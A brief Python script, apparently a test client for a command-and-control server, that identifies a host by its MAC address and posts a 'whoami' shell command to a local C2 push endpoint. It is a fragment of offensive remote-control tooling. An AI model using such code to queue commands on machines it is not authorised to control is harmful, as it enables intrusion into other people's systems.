import re
import uuid

import requests

C2_MODULES_PATH = r'http://127.0.0.1:8000/api/{}/push'


def get_mac():
    """This function returns the first MAC address of the NIC of the PC"""
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))


def main():
    cmdline = {'cmdline': 'whoami'}
    res = requests.post(C2_MODULES_PATH.format(get_mac()), data=cmdline)
    print(res.text)


if __name__ == '__main__':
    main()
